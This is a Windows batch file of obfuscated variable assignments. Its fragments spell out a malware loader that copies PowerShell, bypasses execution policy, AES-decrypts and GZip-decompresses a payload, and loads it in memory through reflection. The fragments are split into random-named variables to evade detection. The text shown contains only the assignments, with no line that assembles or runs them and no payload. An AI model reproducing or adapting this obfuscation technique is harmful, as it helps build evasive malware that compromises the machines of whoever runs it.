@echo off
set "NHJcMDbzAe=in"
set "qQfCGRJdWG=he"
set "RWhRUVnftR=rS"
set "cNpNAQtTWJ=ll"
set "cqAtDNJLRt=1."
set "MStEJUmltX=ws"
set "ajnAoFQPfW=0\"
set "uprvRtAaFT=Sy"
set "XDbfHvDtwf=s\"
set "TfwmuTtrAS=:\"
set "nRfZXyPFVB=rs"
set "uduZlvLyBu=co"
set "yfrixpvTlT=Po"
set "TkPuDELMOY=we"
set "EPoxkKmjgj=we"
set "ZGDyVABrzh= /"
set "xgaUsLQykS=xe"
set "srLuknLVwd=po"
set "LyDczWosiG=\W"
set "nTFcWuzfnh= C"
set "TdbhIAlLwL=.e"
set "WaltWqfrlq=do"
set "VGktAlyjVU=ow"
set "LhtqjLEfip=he"
set "ubpIWaHWKu=st"
set "fWIlIIgmHJ=y "
set "GSplFRajNS=Wi"
set "qUwqNqUCYn=py"
set "HdfjgCXznC=\v"
set "XeVXxGoPCg=32"
set "pzFvHAyscR=nd"
set "UmgrMXDWtY=ll"
set "sQnSUMxzOl=em"
set "XBhvoTmQBc= %~dp0"
set "diLDqsXmuS=cd"
set "SFKEgOTABw=hy.A"
set "XKbcMfmuix=.GZi"
set "MycJZBQUEO=y.Cr"
set "OUrkOKmhPO=DKlY"
set "dVogZgPesq=rUTo"
set "CYsCdxlHto=yste"
set "qWaBYhOHMa=comp"
set "xcSBUccdGv='txe"
set "gxyIxSzePB= [st"
set "JBOMaLgoZH=zuZI"
set "kWpNokmQhH=ct S"
set "XHBdhbdGBq=]::C"
set "WsnowqVRJq=.Key"
set "fPkitwcrpk=ose("
set "NqrZpRXKSC=YI.I"
set "keZDEZlRlN=oArr"
set "UrIJEemegS=ert]"
set "YGNAQvgvXY=6] -"
set "fQdDjjkoqF=tS46"
set "fEpObpCzVM=rqRF"
set "bIEldIUdPF=rity"
set "vWcuOqiSgh=, (,"
set "nFQymEXQXa=l5E7"
set "kEOtQknBOf=m.IO"
set "EpvOJBlcig=ecry"
set "PRLPoFooxe=oin "
set "YkptsfdMHQ=PTtG"
set "PYvlmtGZCx=$rqR"
set "jkpdEZfrrP=-joi"
set "wMrjOsSKLo=Mode"
set "NwHKgyfKuf=.Mod"
set "VUfKsOaYNN=);$D"
set "DJsJoSmaOM=();$"
set "QRtWvWgfqT=urit"
set "YBoPycrLYu=)) {"
set "iYWNphmjal=raph"
set "yVHKMjMFeC=eptH"
set "RJemSxOBxd=[Sys"
set "ydvjjvrXyT=Conv"
set "LMoQhvyKMQ=('da"
set "RwMVZvaODi=[IO."
set "VLZunjZoLM=bypa"
set "ssddvYoaZL=oryS"
set "yjNMmgjkik=)($e"
set "uiEYrnXBkP=::De"
set "WQwlxwzbNN=ne);"
set "mHQVcTPTUC=-Obj"
set "QPMiRGaNld='gni"
set "dcZEDiDMqe='')("
set "BMCYjEitHQ=V = "
set "xQmZfvoUmT=ss -"
set "ukTwzRitiP=Syst"
set "VRKLVDmDbG=F'[-"
set "cYHSOzFNKc=[]] "
set "LjZNpoWQLh=j.En"
set "PmVpGZwWHo== [S"
set "EdiNXNMKmy=ay()"
set "TFGnaYJlNb=$elo"
set "QZWdQNlddk=);$X"
set "PKxYFSExuJ=CFxo"
set "tJVIiQzroV=16] "
set "nVdqJQRELk=flec"
set "hWNahgWMvH=yste"
set "WLeWmCiWuG=join"
set "kmyDECVOok=UIfh"
set "yNGRveuHIT=ws.T"
set "rwaLrJUyRO=KlYI"
set "iyMpGzUzSq=)))"
set "vgxRmzHqLd=YaEe"
set "bDnMIsuKcg=($Ya"
set "pSxsEShkch=.Ass"
set "ajPMIcPriR=Comp"
set "LXPJySyoAH=Secu"
set "OptjRSmNre=$UIf"
set "DWPXFsPTIw=form"
set "fkDbQdDiZN=trea"
set "VeWkfgfWei=Obje"
set "BrpQRzUmlF=ment"
set "wesvZAPOdh= [Sy"
set "ziTCdzVqAa=Gws "
set "oJPiFLtvDS=PxEW"
set "NORFnHmDrd=[Env"
set "lqnEJuKXXE=t Sy"
set "wHhytjpOTK=ke($"
set "kYWRtWvVCL=KlYI"
set "nKmGrOnVcx=gnir"
set "GTwDRLuimH= = N"
set "pPgyrEhiUS= = ["
set "zbGchBRPSy=..-1"
set "CoQdkOgLRB=pres"
set "NPssdbOuwl=mory"
set "jJxIUdGksA=se()"
set "aITzSRZvXL=TllA"
set "FeqMiXZpdD=New-"
set "iQVzCCByBQ=]::N"
set "lodVfBXImc=ck($"
set "NQDrMGVvST=;$kb"
set "XeYoqNxApu=rans"
set "dDZEdBNdbX=rity"
set "WMicOApJnK=yTo("
set "AIiELmfrZJ=daeR"
set "gGPOGvoTWQ=m(, "
set "ZSfGqHvPZp=tryP"
set "ILhNOzUAQW=grap"
set "rWeKnyGjDx=m.Re"
set "zrhNZlQlag=ode]"
set "dLWOXDLmqh=saBm"
set "KIxwRwNnLK==');"
set "jExdoQckfx=iron"
set "KueiQmNYMG=Mo ="
set "AhRQWEIgxX=Disp"
set "dzLNdAaFRd=EeL "
set "HHkeIzZHzl=ddin"
